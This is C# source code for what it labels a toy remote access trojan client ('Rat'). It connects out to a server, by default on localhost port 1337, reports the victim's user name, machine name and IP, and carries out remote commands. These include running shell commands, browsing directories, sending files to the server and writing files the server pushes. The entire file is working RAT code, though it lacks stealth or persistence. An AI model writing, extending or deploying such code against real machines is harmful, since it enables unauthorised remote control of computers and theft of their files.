

using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Collections.Generic;

using da_box;

/** Toy client.
 * -> Accepts calls from server
 * -> Handles predefined commands
 *(-> Some functionality is abstracted away in ToolBhox )
 */

namespace da_rat
{
    class Rat
    {
        // private static ManualResetEvent _connectDone = new ManualResetEvent(false);

        private static byte[] _buffer = new byte[2048];
        private static Socket _clientSocket;

        private static Box ToolBox = new Box();

        /* Personalized Output */
        private static void puts(string text)
        {
            Console.WriteLine(text);
            Console.Write("> ");
        }


        static void Main(string[] args)
        {
            Console.Title = "Rat";

            SetupClient();
            SendLoop();

            _clientSocket.Close();
            Console.WriteLine("Exiting...");
        }

        private static void SetupClient(string home = "127.0.0.1", int port = 1337, bool retry = false)
        {
            if (retry && _clientSocket != null)
                _clientSocket.Close();

            _clientSocket = 
                new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            
            _clientSocket.BeginConnect(IPAddress.Parse(home), port
                , new AsyncCallback(ConnectCallback), _clientSocket);

            // _connectDone.WaitOne();
        }

        /* Try to connect to the server.
         * If successful, send hostName and hostAdress to the server */
        private static void ConnectCallback(IAsyncResult AR)
        {
            try
            {
                Socket client = (Socket)AR.AsyncState;
                client.EndConnect(AR);

                puts("Socket connected to " + client.RemoteEndPoint.ToString());

                puts(GetSysInfo());
                SendMessage(GetSysInfo());

                client.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), client);

                // _connectDone.Set();
            }
            catch (Exception)
            {
                Console.WriteLine("\n\nRetrying to connect...");
                Thread.Sleep(TimeSpan.FromSeconds(1));
                SetupClient(retry: true);
            }
        }

        private static void ReceiveCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;

            try
            {
                if (socket.Connected)
                {
                    int received = socket.EndReceive(AR);
                    string response = String.Empty;

                    byte[] dataBuf = new byte[received];
                    Array.Copy(_buffer, dataBuf, received);


                    /* HANDLE REQUEST */

                    string text = Encoding.ASCII.GetString(dataBuf);

                    /* Perform Seppuku */
                    if (text == "kill" || text == "black_plague" || text == "terminate")
                    {
                        Console.WriteLine("Received `kill` command from home.");

                        _clientSocket.Close();
                        Environment.Exit(0);
                    }

                    /* Break down the received text into a list */
                    List<string> textArr = new List<string>(text.Split(' '));

                    if  (textArr[0].ToLower() == "dir")
                        response = ToolBox.Dir();
                    
                    if (textArr[0].ToLower() == "cd")
                        if (!ToolBox.Cd(textArr[1]))
                            response = "Invalid dir given...";

                    if (textArr[0].ToLower() == "info")
                        response = "OK";

                    if (textArr[0].ToLower() == "cmd")
                    {
                        /* Remove 'header', i.e. "CMD" */
                        text = text.Remove(0, 3);

                        response = "OK\n" + ToolBox.CMD(text);
                        puts(response);
                    }

                    if (textArr[0].ToLower() == "download")
                    {
                        response = SendFile(textArr[1]);
                        puts("Sending: " + response);
                    }

                    /* Check for a file header with a non-empty message, where
                     *  File header: `FILE fileName headerSize textString`                 */
                    if (text.ToLower().Split()[0] == "file" && text.ToLower().Split()[2] != "0")
                    {
                        /* FILE fileName headerSize ... */
                        string fileName = text.ToLower().Split()[1]; 
                        int headerSize = Convert.ToInt32(text.ToLower().Split()[2]);
                        
                        string filePath = ToolBox._path + "\\" + fileName;
                        puts("Trying to wrie to: " + filePath);

                        text = text.Remove(0, headerSize);

                        File.WriteAllText( @filePath, text );

                        text = fileName + " was downloaded locally @ " + filePath;
                    }

                    puts("Pak: " + text);

                    SendMessage(response);
                }
            }
            catch (SocketException) { puts("Server disconnected..."); }
        }

        private static void SendCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;
            socket.EndSend(AR);
        }

        /* message -> byteArray -> (send to) server */
        private static void SendMessage(string message)
        {
            byte[] buffer = Encoding.ASCII.GetBytes(message);
            _clientSocket.Send(buffer);

            _clientSocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None,
                new AsyncCallback(ReceiveCallback), _clientSocket);
        }


        private static string GetSysInfo()
        {
            string localIp = String.Empty;

            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                    localIp = ip.ToString();
            }
            if (String.IsNullOrEmpty(localIp)) localIp = "NoAddrFound";

            /*> INFO user@machine localIp */
            return "INFO " + System.Environment.UserName + "@" +
                System.Environment.MachineName + " " + localIp;
        }


        private static string SendFile(string file)
        {
            string response = "FILE " + file + " ";
            return response += ToolBox.FileToString(file);

            /* FILE fileName headerSize ... */
            // SendMessage(response);
        }

        private static string _help = @"
               __    __          
____________ _/  |__/  |_ ___.__.
\_  __ \__  \\   __\   __<   |  |
 |  | \// __ \|  |  |  |  \___  |
 |__|  (____  /__|  |__|  / ____|
            \/            \/     
_________________________________
__________    ________________   
\______   \  /  _  \__    ___/   
 |       _/ /  /_\  \|    |      
 |    |   \/    |    \    |      
 |____|_  /\____|__  /____|      
        \/         \/            
Commands:
    help

    connect `or` reconnect

    break `or` exit

";

        private static void SendLoop()
        {
            while(true)
            {
                Console.Write("> ");
                string req = Console.ReadLine().Trim();

                    if (req == "break" || req == "exit")
                        break;

                    if (req == "help")
                        puts(_help);
                    
                    else if (req == "connect" || req == "reconnect")
                        SetupClient(retry: true);

                    else if (req == "disconnect")
                        _clientSocket.Close();

                    else
                        if (_clientSocket.Connected)
                            SendMessage(req);
            }
        }
    }
}
